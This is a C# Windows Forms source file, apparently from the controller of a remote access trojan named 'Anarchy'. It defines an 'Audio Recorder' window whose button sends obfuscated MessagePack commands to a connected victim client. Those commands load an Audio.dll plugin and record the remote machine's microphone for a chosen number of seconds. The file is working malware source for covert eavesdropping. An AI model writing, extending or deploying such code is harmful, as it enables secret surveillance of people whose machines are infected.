using System;
using System.ComponentModel;
using System.Media;
using System.Threading;
using System.Windows.Forms;
using Anarchy.Helpers.Algorithm;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;
using ReaLTaiizor.Forms;

namespace Anarchy.Forms;

public class FormAudio : Form
{
    private SoundPlayer SP = new SoundPlayer();

    private IContainer components;

    private System.Windows.Forms.Timer timer1;

    private TextBox textBox1;

    private Label label1;

    private HopeForm hopeForm1;

    private ReaLTaiizor.Controls.Button btnStartStopRecord;

    public Form1 F { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public byte[] BytesToPlay { get; set; }

    public FormAudio()
    {
        this.InitializeComponent();
        base.MinimizeBox = false;
        base.MaximizeBox = false;
    }

    private void btnStartStopRecord_Click(object sender, EventArgs e)
    {
        if (this.textBox1.Text != null && this.textBox1.Text != "")
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "audio";
            msgPack.ForcePathObject("Second").AsString = this.textBox1.Text;
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Audio.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack2.Encode2Bytes());
            Thread.Sleep(100);
            this.btnStartStopRecord.Text = "Wait...";
            this.btnStartStopRecord.Enabled = false;
            DateTime now;
            now = DateTime.Now;
            int num;
            num = Convert.ToInt32(this.textBox1.Text) * 1000;
            while ((DateTime.Now - now).TotalMilliseconds < (double)num)
            {
            }
            this.btnStartStopRecord.Text = "Start Recording";
            this.btnStartStopRecord.Enabled = true;
        }
        else
        {
            MessageBox.Show("Input seconds to record.");
        }
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!this.Client.TcpClient.Connected || !this.ParentClient.TcpClient.Connected)
            {
                base.Close();
            }
        }
        catch
        {
            base.Close();
        }
    }

    private void FormAudio_Load(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormAudio));
        this.timer1 = new System.Windows.Forms.Timer(this.components);
        this.textBox1 = new System.Windows.Forms.TextBox();
        this.label1 = new System.Windows.Forms.Label();
        this.hopeForm1 = new ReaLTaiizor.Forms.HopeForm();
        this.btnStartStopRecord = new ReaLTaiizor.Controls.Button();
        base.SuspendLayout();
        this.timer1.Tick += new System.EventHandler(timer1_Tick);
        this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
        this.textBox1.ForeColor = System.Drawing.SystemColors.WindowFrame;
        this.textBox1.Location = new System.Drawing.Point(12, 57);
        this.textBox1.Name = "textBox1";
        this.textBox1.Size = new System.Drawing.Size(244, 20);
        this.textBox1.TabIndex = 2;
        this.textBox1.Text = "60";
        this.label1.AutoSize = true;
        this.label1.Location = new System.Drawing.Point(262, 60);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(47, 13);
        this.label1.TabIndex = 3;
        this.label1.Text = "seconds";
        this.hopeForm1.ControlBoxColorH = System.Drawing.Color.FromArgb(228, 231, 237);
        this.hopeForm1.ControlBoxColorHC = System.Drawing.Color.FromArgb(245, 108, 108);
        this.hopeForm1.ControlBoxColorN = System.Drawing.Color.Black;
        this.hopeForm1.Cursor = System.Windows.Forms.Cursors.Default;
        this.hopeForm1.Dock = System.Windows.Forms.DockStyle.Top;
        this.hopeForm1.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.hopeForm1.ForeColor = System.Drawing.Color.Gray;
        this.hopeForm1.Image = (System.Drawing.Image)resources.GetObject("hopeForm1.Image");
        this.hopeForm1.Location = new System.Drawing.Point(0, 0);
        this.hopeForm1.MaximizeBox = false;
        this.hopeForm1.Name = "hopeForm1";
        this.hopeForm1.Size = new System.Drawing.Size(321, 40);
        this.hopeForm1.TabIndex = 4;
        this.hopeForm1.Text = "Record";
        this.hopeForm1.ThemeColor = System.Drawing.Color.White;
        this.btnStartStopRecord.BackColor = System.Drawing.Color.Transparent;
        this.btnStartStopRecord.Cursor = System.Windows.Forms.Cursors.Hand;
        this.btnStartStopRecord.EnteredColor = System.Drawing.Color.FromArgb(32, 34, 37);
        this.btnStartStopRecord.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
        this.btnStartStopRecord.Image = null;
        this.btnStartStopRecord.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
        this.btnStartStopRecord.InactiveColor = System.Drawing.Color.FromArgb(32, 34, 37);
        this.btnStartStopRecord.Location = new System.Drawing.Point(10, 82);
        this.btnStartStopRecord.Name = "btnStartStopRecord";
        this.btnStartStopRecord.PressedColor = System.Drawing.Color.FromArgb(165, 37, 37);
        this.btnStartStopRecord.Size = new System.Drawing.Size(293, 30);
        this.btnStartStopRecord.TabIndex = 5;
        this.btnStartStopRecord.Text = "Start Recording";
        this.btnStartStopRecord.TextAlignment = System.Drawing.StringAlignment.Center;
        this.btnStartStopRecord.Click += new System.EventHandler(btnStartStopRecord_Click);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.White;
        base.ClientSize = new System.Drawing.Size(321, 125);
        base.Controls.Add(this.btnStartStopRecord);
        base.Controls.Add(this.hopeForm1);
        base.Controls.Add(this.label1);
        base.Controls.Add(this.textBox1);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.MaximizeBox = false;
        this.MaximumSize = new System.Drawing.Size(1920, 1080);
        this.MinimumSize = new System.Drawing.Size(190, 40);
        base.Name = "FormAudio";
        base.ShowIcon = false;
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Audio Recorder";
        base.Load += new System.EventHandler(FormAudio_Load);
        base.ResumeLayout(false);
        base.PerformLayout();
    }
}